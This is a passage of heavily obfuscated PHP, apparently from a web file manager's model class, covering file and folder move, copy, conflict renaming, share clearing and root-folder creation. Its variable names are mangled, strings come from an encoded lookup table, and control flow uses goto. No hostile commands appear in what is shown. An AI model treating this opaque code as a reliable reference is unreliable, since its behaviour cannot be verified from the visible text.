$this->where($éÌŠ¹°)->select(); $”ó±‘Ìú = $”ó±‘Ìú ? $”ó±‘Ìú : array(); $½±ë–ùò = array_to_keyvalue($”ó±‘Ìú, $Œı¸–òÑ[191]); $this->_childrenListCache[$å¯Í†ßº] = $½±ë–ùò; foreach ($½±ë–ùò as $å¯Í†ßº => $©­€²ªĞ) { $this->_childrenItemCache[$å¯Í†ßº] = $©­€²ªĞ; } return $½±ë–ùò; } private function fileNameExistAuto($³è½æÁ¡, $¯­Ÿ»¢Ÿ) { $şÒÊßÑ› =& $_SERVER[ïÃ°£«Ê]; if ($¯­Ÿ»¢Ÿ[$şÒÊßÑ›[520]] == $şÒÊßÑ›[91]) { return $this->fileNameExist($³è½æÁ¡, $¯­Ÿ»¢Ÿ[$şÒÊßÑ›[32]]); } return $this->fileNameExistCache($³è½æÁ¡, $¯­Ÿ»¢Ÿ[$şÒÊßÑ›[32]]); } private function fileNameExistCache($£¢úœ¢†, $§¬ãæÁ) { $á¨™Æ =& $_SERVER[ïÃ°£«Ê]; $§¬ãæÁ = strtolower($§¬ãæÁ); $ñÑ¾¤×ò = $this->_childrenList($£¢úœ¢†); foreach ($ñÑ¾¤×ò as $Ùîç±‹¼) { if ($§¬ãæÁ == strtolower($Ùîç±‹¼[$á¨™Æ[32]])) { return $Ùîç±‹¼[$á¨™Æ[191]]; } } return !1; } private function fileNameAutoCache($êï­š, $Ïñ­ ¦, $ÍÓ°ƒ¼®, $¹á­öŠô) { $Çù±š£İ =& $_SERVER[ïÃ°£«Ê]; $É—Ù„Œ  = $this->_childrenList($êï­š); $â£ä†ô = array_to_keyvalue($É—Ù„Œ , $Çù±š£İ[12], $Çù±š£İ[32]); return $this->fileNameAutoGet($â£ä†ô, $Ïñ­ ¦, $ÍÓ°ƒ¼®, $¹á­öŠô); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ñõšİã», $Åìò‹“ü, $’–€şî© = REPEAT_REPLACE, $Ùˆã¦ş÷ = '') { $© ‰ŠçÆ =& $_SERVER[ïÃ°£«Ê]; $ê›ÔºëÍ = $this->sourceInfo($Ñõšİã»); $Éèµ¥øñ = $this->sourceInfo($Åìò‹“ü); if ($ê›ÔºëÍ[$© ‰ŠçÆ[190]] == $Éèµ¥øñ[$© ‰ŠçÆ[191]]) { if ($ê›ÔºëÍ[$© ‰ŠçÆ[520]] == $© ‰ŠçÆ[91]) { Model($© ‰ŠçÆ[518])->restore(array($Ñõšİã»)); } if (!$Ùˆã¦ş÷ || $Ùˆã¦ş÷ == $ê›ÔºëÍ[$© ‰ŠçÆ[32]]) { return $Ñõšİã»; } } $Ï½¸”× = $this->pathInfoMore($Ñõšİã»); if ($this->isParentOf($Ñõšİã», $Åìò‹“ü)) { return !1; } if (!$ê›ÔºëÍ || !$Éèµ¥øñ || $Éèµ¥øñ[$© ‰ŠçÆ[500]] != $© ‰ŠçÆ[91]) { return !1; } Hook::trigger($© ‰ŠçÆ[680], $Ï½¸”×); $this->targetIsDelete = intval($ê›ÔºëÍ[$© ‰ŠçÆ[520]]); if ($ê›ÔºëÍ[$© ‰ŠçÆ[190]] == $Åìò‹“ü && $Ùˆã¦ş÷ != $ê›ÔºëÍ[$© ‰ŠçÆ[32]]) { $’ÆáôÉ¥ = $this->fileNameExist($Åìò‹“ü, $Ùˆã¦ş÷); if ($’ÆáôÉ¥ && $ê›ÔºëÍ[$© ‰ŠçÆ[500]] == $© ‰ŠçÆ[228]) { $ºìÉ‰ßÖ = $this->sourceInfo($’ÆáôÉ¥); $ïíõà»÷ = $this->fileHistory($ºìÉ‰ßÖ, $ê›ÔºëÍ[$© ‰ŠçÆ[557]], $ê›ÔºëÍ[$© ‰ŠçÆ[79]]); if (!$ïíõà»÷) { Model($© ‰ŠçÆ[560])->remove($ê›ÔºëÍ[$© ‰ŠçÆ[557]]); } $this->removeNow($Ñõšİã», !1); $this->folderSizeReset($Åìò‹“ü); Hook::trigger($© ‰ŠçÆ[681], $Ï½¸”×); return $’ÆáôÉ¥; } } $ÖÉµ†Òš = $Ùˆã¦ş÷ ? $Ùˆã¦ş÷ : $ê›ÔºëÍ[$© ‰ŠçÆ[32]]; $this->lockMoveStart($Ñõšİã»); $this->lockWriteStart($Åìò‹“ü, $ÖÉµ†Òš); $ÚËì±»Ê = array($© ‰ŠçÆ[652] => array(), $© ‰ŠçÆ[682] => !1); $this->clearShare($Ñõšİã», $Åìò‹“ü); $´œÀæÌ¿ = $this->fileNameExistAuto($Åìò‹“ü, $ê›ÔºëÍ); $øšªÙ—ò = $this->_move($Ñõšİã», $Åìò‹“ü, $’–€şî©, $ÚËì±»Ê, $Ùˆã¦ş÷); $this->sourceCacheClear(); if ($ê›ÔºëÍ[$© ‰ŠçÆ[500]] == $© ‰ŠçÆ[91] && $´œÀæÌ¿) { $this->folderSizeResetChildren($øšªÙ—ò); } Model($© ‰ŠçÆ[230])->linkAdd($ÚËì±»Ê[$© ‰ŠçÆ[652]]); if ($øšªÙ—ò && $´œÀæÌ¿ && $ÚËì±»Ê[$© ‰ŠçÆ[682]]) { $¼éï øÀ = $ê›ÔºëÍ[$© ‰ŠçÆ[500]] == $© ‰ŠçÆ[91] ? $this->_childrenListSelect($Ñõšİã») : !1; $­Í¢şğª = $¼éï øÀ && count($¼éï øÀ) > 0 ? !0 : !1; $this->removeNow($Ñõšİã», $­Í¢şğª); } $this->lockMoveEnd($Ñõšİã»); $this->lockWriteEnd($Åìò‹“ü, $ÖÉµ†Òš); $this->folderSizeReset($ê›ÔºëÍ[$© ‰ŠçÆ[190]]); $this->folderSizeReset($Åìò‹“ü); $¡†ğ©±Ò = array($ê›ÔºëÍ[$© ‰ŠçÆ[190]], $Åìò‹“ü); if ($ê›ÔºëÍ[$© ‰ŠçÆ[500]] == $© ‰ŠçÆ[91]) { $¡†ğ©±Ò[] = $Ñõšİã»; } $this->updateModifyTime($¡†ğ©±Ò); Model($© ‰ŠçÆ[655])->eventMove($Ñõšİã», $ê›ÔºëÍ[$© ‰ŠçÆ[190]], $Åìò‹“ü); Hook::trigger($© ‰ŠçÆ[681], $Ï½¸”×); return $øšªÙ—ò; } private function _move($‘ùœóºŠ, $ö…Ã‘…Õ, $”½İ¤ûà, &$ä±‡âÎè, $³øõŠˆ = '') { $€ïº“Ë =& $_SERVER[ïÃ°£«Ê]; $ºòø ø = $this->sourceInfo($‘ùœóºŠ); $¼€Êù = $ºòø ø[$€ïº“Ë[500]] == $€ïº“Ë[91]; $üÜéñ©ï = $³øõŠˆ ? $³øõŠˆ : $ºòø ø[$€ïº“Ë[32]]; $õ±çÔİß = $this->fileNameExistAuto($ö…Ã‘…Õ, $ºòø ø); $this->lockMoveStart($‘ùœóºŠ); $this->lockWriteStart($ö…Ã‘…Õ, $üÜéñ©ï); if (!$õ±çÔİß) { return $this->_moveForce($‘ùœóºŠ, $ö…Ã‘…Õ, $üÜéñ©ï); } $Ò÷ıµ¹ñ = $õ±çÔİß; $ú»ıùì = !1; if ($¼€Êù) { if ($”½İ¤ûà == REPEAT_RENAME_FOLDER) { $üÜéñ©ï = $this->fileNameAuto($ö…Ã‘…Õ, $üÜéñ©ï, $”½İ¤ûà, $¼€Êù); $Ò÷ıµ¹ñ = $this->_moveForce($‘ùœóºŠ, $ö…Ã‘…Õ, $üÜéñ©ï); } else { $Úœê¥ôö = $this->_childrenListSelect($‘ùœóºŠ); foreach ($Úœê¥ôö as $İŸÉáïÒ) { $êĞéÁà¶ = REPEAT_REPLACE; $this->_move($İŸÉáïÒ[$€ïº“Ë[191]], $õ±çÔİß, $êĞéÁà¶, $ä±‡âÎè); } $ú»ıùì = !0; } } else { if ($”½İ¤ûà == REPEAT_RENAME || $”½İ¤ûà == REPEAT_RENAME_FOLDER) { $üÜéñ©ï = $this->fileNameAuto($ö…Ã‘…Õ, $üÜéñ©ï, $”½İ¤ûà, $¼€Êù); $Ò÷ıµ¹ñ = $this->_moveForce($‘ùœóºŠ, $ö…Ã‘…Õ, $üÜéñ©ï); } else { $ã–†Õçç = $this->sourceInfoCache($õ±çÔİß); $¬ÊÓµ± = $this->fileHistory($ã–†Õçç, $ºòø ø[$€ïº“Ë[557]], $ºòø ø[$€ïº“Ë[79]]); if ($¬ÊÓµ±) { $ä±‡âÎè[$€ïº“Ë[652]][] = $ºòø ø[$€ïº“Ë[557]]; } $ú»ıùì = !0; } } if ($ú»ıùì) { $ä±‡âÎè[$€ïº“Ë[682]] = !0; } return $Ò÷ıµ¹ñ; } private function _moveForce($œ×†…óš, $ò²’…Ø·, $ªàÉ¦‹ğ) { $á÷Œúù¸ =& $_SERVER[ïÃ°£«Ê]; $ä”Œééº = $this->sourceInfo($œ×†…óš); $ ¥¯öİÊ = $this->sourceInfo($ò²’…Ø·); $¸‘‡ç¢¹ = $ä”Œééº[$á÷Œúù¸[500]] == $á÷Œúù¸[91]; $™²©éªñ = array($á÷Œúù¸[492] => $ ¥¯öİÊ[$á÷Œúù¸[191]], $á÷Œúù¸[674] => $ ¥¯öİÊ[$á÷Œúù¸[604]] . $ ¥¯öİÊ[$á÷Œúù¸[191]] . $á÷Œúù¸[50], $á÷Œúù¸[670] => $ ¥¯öİÊ[$á÷Œúù¸[188]], $á÷Œúù¸[671] => $ ¥¯öİÊ[$á÷Œúù¸[589]], $á÷Œúù¸[673] => USER_ID, $á÷Œúù¸[509] => $ªàÉ¦‹ğ); $®óÌĞÄÆ = $ä”Œééº[$á÷Œúù¸[188]] == SourceModel::TYPE_GROUP && $ ¥¯öİÊ[$á÷Œúù¸[188]] == SourceModel::TYPE_GROUP && $ä”Œééº[$á÷Œúù¸[589]] == $ ¥¯öİÊ[$á÷Œúù¸[589]]; if (!$®óÌĞÄÆ && $this->moveClearAuth) { Model($á÷Œúù¸[587])->authClear($œ×†…óš); } $•úÍãáà = $ä”Œééº[$á÷Œúù¸[520]] == $á÷Œúù¸[91] && $ ¥¯öİÊ[$á÷Œúù¸[520]] != $á÷Œúù¸[91]; if ($•úÍãáà) { $™²©éªñ[$á÷Œúù¸[519]] = 0; } if ($¸‘‡ç¢¹) { $Õ‰ê¦‡ = array($á÷Œúù¸[674] => array($á÷Œúù¸[635], $ä”Œééº[$á÷Œúù¸[604]] . $ä”Œééº[$á÷Œúù¸[191]] . $á÷Œúù¸[636])); $ÚõÑˆÓ‘ = $ä”Œééº[$á÷Œúù¸[604]] . $ä”Œééº[$á÷Œúù¸[191]] . $á÷Œúù¸[50]; $¿½ß§Æ = $ ¥¯öİÊ[$á÷Œúù¸[604]] . $ ¥¯öİÊ[$á÷Œúù¸[191]] . $á÷Œúù¸[50] . $ä”Œééº[$á÷Œúù¸[191]] . $á÷Œúù¸[50]; $ó€Ñ¡âƒ = array($á÷Œúù¸[674] => array($á÷Œúù¸[683], "\x72\145\x70\154\x61\x63\145\x28\160\141\162\x65\x6e\x74\x4c\145\166\145\x6c\54\47{$ÚõÑˆÓ‘}\x27\54\47{$¿½ß§Æ}\47\x29"), $á÷Œúù¸[670] => $ ¥¯öİÊ[$á÷Œúù¸[188]], $á÷Œúù¸[671] => $ ¥¯öİÊ[$á÷Œúù¸[589]]); if ($•úÍãáà) { $ó€Ñ¡âƒ[$á÷Œúù¸[519]] = 0; } $this->where($Õ‰ê¦‡)->data($ó€Ñ¡âƒ)->save(); } $this->where(array($á÷Œúù¸[506] => $œ×†…óš))->data($™²©éªñ)->save(); return $œ×†…óš; } private function clearShare($Ğ¡‰¢€ò, $ï°Åİğè) { $éàĞß¯Ò =& $_SERVER[ïÃ°£«Ê]; $±ìå•¢á = $this->sourceInfo($Ğ¡‰¢€ò); $Şê¹ÅÛÙ = $this->sourceInfo($ï°Åİğè); if ($±ìå•¢á[$éàĞß¯Ò[589]] == $Şê¹ÅÛÙ[$éàĞß¯Ò[589]] && $±ìå•¢á[$éàĞß¯Ò[188]] == $éàĞß¯Ò[684]) { return; } $™¶ì¤Ü  = array($éàĞß¯Ò[604] => array($éàĞß¯Ò[635], $±ìå•¢á[$éàĞß¯Ò[604]] . $Ğ¡‰¢€ò . $éàĞß¯Ò[636])); $µÜ¾ıåœ = $this->field($éàĞß¯Ò[506])->where($™¶ì¤Ü )->getField($éàĞß¯Ò[191], !0); if (!$µÜ¾ıåœ) { return; } $™¶ì¤Ü  = array($éàĞß¯Ò[191] => array($éàĞß¯Ò[7], $µÜ¾ıåœ), $éàĞß¯Ò[685] => 1); $„ˆ¡Ğò¦ = Model($éàĞß¯Ò[686])->field($éàĞß¯Ò[687])->where($™¶ì¤Ü )->select(); if (!$„ˆ¡Ğò¦) { return; } $„ˆ¡Ğò¦ = array_to_keyvalue($„ˆ¡Ğò¦, $éàĞß¯Ò[12], $éàĞß¯Ò[687]); $™¶ì¤Ü  = array($éàĞß¯Ò[687] => array($éàĞß¯Ò[7], $„ˆ¡Ğò¦)); Model($éàĞß¯Ò[686])->where($™¶ì¤Ü )->save(array($éàĞß¯Ò[685] => 0)); Model($éàĞß¯Ò[688])->where($™¶ì¤Ü )->delete(); } public function copyFolderFromIO($ı¡ˆ˜¾¶, $€Ó„©› , $ß•†“áÙ, $Ñ¤¹È©Ñ, $»‘ûº†•, $™œò›èó = false) { $Ûš§é±Ö =& $_SERVER[ïÃ°£«Ê]; $’õƒ½¨ª = array($Ûš§é±Ö[653] => array(), $Ûš§é±Ö[654] => array(), $Ûš§é±Ö[652] => array(), $Ûš§é±Ö[689] => array()); $ûØ¥©  = $™œò›èó ? $™œò›èó : $ı¡ˆ˜¾¶->pathThis($€Ó„©› ); $î×åìÂ = $this->fileNameExist($ß•†“áÙ, $ûØ¥© ); $™ğòÜ¸„ = $this->mkdir($ß•†“áÙ, $ûØ¥© , $Ñ¤¹È©Ñ); if (!$î×åìÂ || $Ñ¤¹È©Ñ == REPEAT_RENAME_FOLDER) { $Ñ¤¹È©Ñ = !1; } if ($î×åìÂ) { $this->_childrenAllMake($î×åìÂ); } Hook::trigger($Ûš§é±Ö[690]); $×ĞÚÛ…É = KodIO::ioFileDriverGet($Ûš§é±Ö[498] . $ß•†“áÙ . $Ûš§é±Ö[402]); $this->_copyChildTo($ı¡ˆ˜¾¶, $€Ó„©› , $™ğòÜ¸„, $Ñ¤¹È©Ñ, $’õƒ½¨ª, $»‘ûº†•, $×ĞÚÛ…É); Hook::trigger($Ûš§é±Ö[691]); if ($™ğòÜ¸„) { $this->folderSizeResetChildren($™ğòÜ¸„); } $this->_childrenListClear(); Model($Ûš§é±Ö[471])->addAll($’õƒ½¨ª[$Ûš§é±Ö[653]], array(), !0); Model($Ûš§é±Ö[655])->eventCopy($™ğòÜ¸„); $this->saveAll($’õƒ½¨ª[$Ûš§é±Ö[654]]); Model($Ûš§é±Ö[560])->linkAdd($’õƒ½¨ª[$Ûš§é±Ö[652]]); Model($Ûš§é±Ö[560])->remove($’õƒ½¨ª[$Ûš§é±Ö[689]]); $this->folderSizeReset($ß•†“áÙ); $this->updateModifyTime($ß•†“áÙ); return $™ğòÜ¸„; } private function _copyChildTo($üˆæğõæ, $Ø¡À×ê, $Ü¸·Ê‡, $ÖÒÔÆ£È, &$ˆÈ”î¨, $Ø»¬£°„, $°íĞ’) { $Ş€ùÉ“Â =& $_SERVER[ïÃ°£«Ê]; $¨Û¯¼ = $this->sourceInfoCache($Ü¸·Ê‡); $¾¿É÷Şı = $üˆæğõæ->listPath($Ø¡À×ê); $¾¿É÷Şı = $¾¿É÷Şı ? $¾¿É÷Şı : array($Ş€ùÉ“Â[86] => array(), $Ş€ùÉ“Â[85] => array()); $—ßÜ¾Şê = array_merge($¾¿É÷Şı[$Ş€ùÉ“Â[86]], $¾¿É÷Şı[$Ş€ùÉ“Â[85]]); $ı©şéó« = $this->_addFiles($üˆæğõæ, $°íĞ’, $¾¿É÷Şı[$Ş€ùÉ“Â[86]], $Ø»¬£°„); $«òÓÏÎİ = array(); foreach ($—ßÜ¾Şê as &$‘ÍÖÎ÷õ) { if (isset($ı©şéó«[$‘ÍÖÎ÷õ[$Ş€ùÉ“Â[32]]])) { $‘ÍÖÎ÷õ = $ı©şéó«[$‘ÍÖÎ÷õ[$Ş€ùÉ“Â[32]]]; } $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[500]] = $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[33]] == $Ş€ùÉ“Â[78]; $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[501]] = substr(_get($‘ÍÖÎ÷õ, $Ş€ùÉ“Â[166], $Ş€ùÉ“Â[12]), 0, 10); $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[79]] = _get($‘ÍÖÎ÷õ, $Ş€ùÉ“Â[79], 0); $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[557]] = _get($‘ÍÖÎ÷õ, $Ş€ùÉ“Â[557], 0); if (!isset($‘ÍÖÎ÷õ[$Ş€ùÉ“Â[692]]) && $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[557]]) { $ˆÈ”î¨[$Ş€ùÉ“Â[689]][] = $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[557]]; } if ($ÖÒÔÆ£È) { $Ëğ¦¹Åõ = $this->fileNameExistCache($Ü¸·Ê‡, $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[32]]); if ($Ëğ¦¹Åõ) { if ($‘ÍÖÎ÷õ[$Ş€ùÉ“Â[500]] || $ÖÒÔÆ£È == REPEAT_SKIP) { continue; } if ($ÖÒÔÆ£È == REPEAT_REPLACE) { $ÑæÈ¯öË = $this->sourceInfoCache($Ëğ¦¹Åõ); $×¢±î•ı = $this->fileHistory($ÑæÈ¯öË, $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[557]], $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[79]]); if ($×¢±î•ı) { $ˆÈ”î¨[$Ş€ùÉ“Â[652]][] = $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[557]]; } continue; } else { if ($ÖÒÔÆ£È == REPEAT_RENAME) { $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[32]] = $this->fileNameAutoCache($Ü¸·Ê‡, $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[32]], $ÖÒÔÆ£È, !1); } } } } if (!$‘ÍÖÎ÷õ[$Ş€ùÉ“Â[500]] && $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[557]] == 0) { continue; } if (!$‘ÍÖÎ÷õ[$Ş€ùÉ“Â[500]] && $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[557]]) { $ˆÈ”î¨[$Ş€ùÉ“Â[652]][] = $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[557]]; } $«òÓÏÎİ[] = $this->_makeItemData($‘ÍÖÎ÷õ, $¨Û¯¼, $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[32]]); } unset($‘ÍÖÎ÷õ); if (!empty($«òÓÏÎİ)) { $this->addAll($«òÓÏÎİ); $this->_childrenListSelect($Ü¸·Ê‡); } $†±Ë“ı = $this->_childrenList($Ü¸·Ê‡); $†±Ë“ı = array_to_keyvalue($†±Ë“ı, $Ş€ùÉ“Â[32]); foreach ($—ßÜ¾Şê as $‘ÍÖÎ÷õ) { $ÑæÈ¯öË = $†±Ë“ı[$‘ÍÖÎ÷õ[$Ş€ùÉ“Â[32]]]; $ší‰¤ĞÙ = $ÑæÈ¯öË[$Ş€ùÉ“Â[191]]; $this->_copyApplyMeta($ÑæÈ¯öË, $ˆÈ”î¨); if ($‘ÍÖÎ÷õ[$Ş€ùÉ“Â[33]] == $Ş€ùÉ“Â[78]) { $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[87]] = $üˆæğõæ->getPathInner($‘ÍÖÎ÷õ[$Ş€ùÉ“Â[87]]); $this->_copyChildTo($üˆæğõæ, $‘ÍÖÎ÷õ[$Ş€ùÉ“Â[87]], $ší‰¤ĞÙ, $ÖÒÔÆ£È, $ˆÈ”î¨, $Ø»¬£°„, $°íĞ’); } } } private function _addFiles($î‘ù³¡¥, $¾æÇ½‡Ï, $‘÷Çî»Ñ, $ŸğÎ¦×Ÿ) { $ÖĞ³Æ­ =& $_SERVER[ïÃ°£«Ê]; if (!$‘÷Çî»Ñ || count($‘÷Çî»Ñ) == 0) { return array(); } $ÏÊ”ÔŸ¿ = array(); foreach ($‘÷Çî»Ñ as &$·¥ãÃ¶ª) { Hook::trigger($ÖĞ³Æ­[693], $·¥ãÃ¶ª); $·¥ãÃ¶ª[$ÖĞ³Æ­[87]] = $î‘ù³¡¥->getPathInner($·¥ãÃ¶ª[$ÖĞ³Æ­[87]]); $£á‹‡÷ª = $î‘ù³¡¥->hashSimple($·¥ãÃ¶ª[$ÖĞ³Æ­[87]]); $¸ö´€» = $î‘ù³¡¥->hashMd5($·¥ãÃ¶ª[$ÖĞ³Æ­[87]]); if (strlen($¸ö´€») > 10 && !isset($ÏÊ”ÔŸ¿[$¸ö´€»])) { $ÏÊ”ÔŸ¿[$¸ö´€»] = array(); } $·¥ãÃ¶ª[$ÖĞ³Æ­[694]] = $£á‹‡÷ª; $·¥ãÃ¶ª[$ÖĞ³Æ­[563]] = $¸ö´€»; $ÏÊ”ÔŸ¿[$¸ö´€»][] =& $·¥ãÃ¶ª; if (count($ÏÊ”ÔŸ¿[$¸ö´€»]) > 1) { $·¥ãÃ¶ª[$ÖĞ³Æ­[692]] = !0; } Hook::trigger($ÖĞ³Æ­[695], $·¥ãÃ¶ª); } unset($·¥ãÃ¶ª); $®·ş‚® = array($ÖĞ³Æ­[563] => array($ÖĞ³Æ­[7], array_keys($ÏÊ”ÔŸ¿))); $Áİ—ï‰ = Model($ÖĞ³Æ­[696]); $¥›ï·¯ç = $Áİ—ï‰->where($®·ş‚®)->select(); $¥›ï·¯ç = $¥›ï·¯ç ? $¥›ï·¯ç : array(); foreach ($¥›ï·¯ç as $ùÒ·îâ) { if (!isset($ÏÊ”ÔŸ¿[$ùÒ·îâ[$ÖĞ³Æ­[563]]])) { continue; } $½Şáéî = $ÏÊ”ÔŸ¿[$ùÒ·îâ[$ÖĞ³Æ­[563]]]; foreach ($½Şáéî as &$·¥ãÃ¶ª) { $·¥ãÃ¶ª[$ÖĞ³Æ­[557]] = $ùÒ·îâ[$ÖĞ³Æ­[557]]; $·¥ãÃ¶ª[$ÖĞ³Æ­[692]] = !0; } unset($·¥ãÃ¶ª); } $Éµ¦²ï = array(); foreach ($‘÷Çî»Ñ as $“ı¢Íí¹) { Hook::trigger($ÖĞ³Æ­[697], $“ı¢Íí¹); if (isset($“ı¢Íí¹[$ÖĞ³Æ­[692]]) && $“ı¢Íí¹[$ÖĞ³Æ­[692]]) { Hook::trigger($ÖĞ³Æ­[698], $“ı¢Íí¹); continue; } $àğÀØø¯ = $î‘ù³¡¥->getPathInner($“ı¢Íí¹[$ÖĞ³Æ­[87]]); $Š…ãı¶Ö = $Áİ—ï‰->addFileMake($àğÀØø¯, $¾æÇ½‡Ï, $“ı¢Íí¹[$ÖĞ³Æ­[79]], $“ı¢Íí¹[$ÖĞ³Æ­[694]], $“ı¢Íí¹[$ÖĞ³Æ­[563]], $“ı¢Íí¹[$ÖĞ³Æ­[32]], $ŸğÎ¦×Ÿ); Hook::trigger($ÖĞ³Æ­[698], $“ı¢Íí¹); if (!is_array($Š…ãı¶Ö)) { continue; } $Éµ¦²ï[] = $Š…ãı¶Ö; } $Áİ—ï‰->addAll($Éµ¦²ï); $®·ş‚® = array($ÖĞ³Æ­[563] => array($ÖĞ³Æ­[7], array_keys($ÏÊ”ÔŸ¿))); $¥›ï·¯ç = $Áİ—ï‰->where($®·ş‚®)->select(); $¥›ï·¯ç = $¥›ï·¯ç ? $¥›ï·¯ç : array(); foreach ($¥›ï·¯ç as $ùÒ·îâ) { if (!isset($ÏÊ”ÔŸ¿[$ùÒ·îâ[$ÖĞ³Æ­[563]]])) { continue; } $ş¤àüÚÉ =& $ÏÊ”ÔŸ¿[$ùÒ·îâ[$ÖĞ³Æ­[563]]]; foreach ($ş¤àüÚÉ as &$·¥ãÃ¶ª) { $·¥ãÃ¶ª[$ÖĞ³Æ­[557]] = $ùÒ·îâ[$ÖĞ³Æ­[557]]; } unset($·¥ãÃ¶ª); } $œı†×ùù = array(); foreach ($‘÷Çî»Ñ as $ğŞéñ ğ) { $œı†×ùù[$ğŞéñ ğ[$ÖĞ³Æ­[32]]] = $ğŞéñ ğ; } return $œı†×ùù; } } define($_SERVER[ïÃ°£«Ê][699], $_SERVER[ïÃ°£«Ê][700]); $yhkzocepwv = $_SERVER[ïÃ°£«Ê][701]; goto dóš´®¦·; Aô¹ß±Œ¾º: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ËöÌ×ÏÚ) { $½˜Œ‡©ú =& $_SERVER[ïÃ°£«Ê]; $‡±Áó·™ = Model($½˜Œ‡©ú[597])->where(array($½˜Œ‡©ú[1971] => $ËöÌ×ÏÚ))->find(); $ßù÷¢„ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ËöÌ×ÏÚ, $‡±Áó·™[$½˜Œ‡©ú[32]]); $this->userDesktopAdd($ßù÷¢„); return $ßù÷¢„; } public function userDesktopAdd($»‚”ºÌï) { $¼Î–‡©Ò =& $_SERVER[ïÃ°£«Ê]; $‘¶ù»ŠÁ = LNG($¼Î–‡©Ò[2467]); $Æœ¦àµó = $this->mkdir($»‚”ºÌï, $‘¶ù»ŠÁ); $this->metaSet($Æœ¦àµó, $¼Î–‡©Ò[2468], $¼Î–‡©Ò[91]); $this->metaSet($»‚”ºÌï, $¼Î–‡©Ò[2469], $Æœ¦àµó); } public function userPathSafeAdd($›„™È‡) { $Šİû××× =& $_SERVER[ïÃ°£«Ê]; $É¼· èú = Model($Šİû×××[597])->getInfoFull($›„™È‡); if (!$É¼· èú) { return !1; } if (_get($É¼· èú, $Šİû×××[618])) { return $É¼· èú[$Šİû×××[555]][$Šİû×××[2470]]; } $éâ÷®à = $this->_mkdirRoot(SourceModel::TYPE_USER, $›„™È‡, $Šİû×××[2471], $Šİû×××[2472]); Model($Šİû×××[597])->metaSet($›„™È‡, $Šİû×××[2470], $éâ÷®à); $this->metaSet($éâ÷®à, $Šİû×××[2473], $›„™È‡); return $éâ÷®à; } public function userPathAppAdd($¯éŞŒĞ, $ßÕ‚¦– = '', $Ëâ´†¤¯ = '') { $ºÒŠ™ã¡ =& $_SERVER[ïÃ°£«Ê]; $ˆ ¼ÙŞ = Model($ºÒŠ™ã¡[597])->getInfoFull($¯éŞŒĞ); if (!$ˆ ¼ÙŞ) { return !1; } $ÂİÈôìÒ = $ˆ ¼ÙŞ[$ºÒŠ™ã¡[555]] ? $ˆ ¼ÙŞ[$ºÒŠ™ã¡[555]] : array(); $°ÆŸß×” = $ÂİÈôìÒ[$ºÒŠ™ã¡[2474]]; if (!$°ÆŸß×”) { $°ÆŸß×” = $this->_mkdirRoot(SourceModel::TYPE_USER, $¯éŞŒĞ, $ºÒŠ™ã¡[2475], $ºÒŠ™ã¡[2476]); Model($ºÒŠ™ã¡[597])->metaSet($¯éŞŒĞ, $ºÒŠ™ã¡[2474], $°ÆŸß×” . $ºÒŠ™ã¡[12]); $this->metaSet($°ÆŸß×”, $ºÒŠ™ã¡[2474], $¯éŞŒĞ); } if (!$ßÕ‚¦–) { return $°ÆŸß×”; } $ïá’¥² = $ÂİÈôìÒ[$ºÒŠ™ã¡[2477] . $ßÕ‚¦–]; if (!$ïá’¥²) { $ïá’¥² = $this->mkdir($°ÆŸß×”, $ßÕ‚¦–); Model($ºÒŠ™ã¡[597])->metaSet($¯éŞŒĞ, $ºÒŠ™ã¡[2477] . $ßÕ‚¦–, $ïá’¥²); $this->metaSet($ïá’¥², $ºÒŠ™ã¡[2477] . $ßÕ‚¦–, $¯éŞŒĞ); } if (!$Ëâ´†¤¯) { return $ïá’¥²; } $ÑõáØÄ¬ = $this->mkdir($ïá’¥², $Ëâ´†¤¯); return $ÑõáØÄ¬; } public function groupRootAdd($“‡ÙËÍù) { $ÂÇˆéÍã =& $_SERVER[ïÃ°£«Ê]; $ƒ¹æÈ’ = Model($ÂÇˆéÍã[605])->where(array($ÂÇˆéÍã[2272] => $“‡ÙËÍù))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $“‡ÙËÍù, $ƒ¹æÈ’[$ÂÇˆéÍã[32]]); } public function systemRootPathAdd($±À½¨Ùö) { if ($±À½¨Ùö != $_SERVER[ïÃ°£«Ê][628]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $±À½¨Ùö); } public function userRootRemove($§óİŸÂÇ) { $Ü‡²Ô·Å = $this->targetSourceRoot(SourceModel::TYPE_USER, $§óİŸÂÇ, !0); foreach ($Ü‡²Ô·Å as $à¥Ê¬ò½) { if (!$à¥Ê¬ò½) { continue; } $this->remove($à¥Ê¬ò½[$_SERVER[ïÃ°£«Ê][191]], !1); } } public function groupRootRemove($˜èÚèÇ‚) { $ìõ˜·‡É = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $˜èÚèÇ‚); if (!$ìõ˜·‡É) { return; } $this->remove($ìõ˜·‡É[$_SERVER[ïÃ°£«Ê][191]], !1); } private function _mkdirRoot($™ÙÎ×ô®, $°¦Õ”¨›, $ñÔÃ„†©, $£À“š‹É = '') { $§ƒÑà½ =& $_SERVER[ïÃ°£«Ê]; $²¶¢šŒ = KodUser::id(); $àú¨šå˜ = array($§ƒÑà½[492] => 0, $§ƒÑà½[670] => $™ÙÎ×ô®, $§ƒÑà½[671] => $°¦Õ”¨›, $§ƒÑà½[668] => 1, $§ƒÑà½[672] => $²¶¢šŒ, $§ƒÑà½[673] => $²¶¢šŒ, 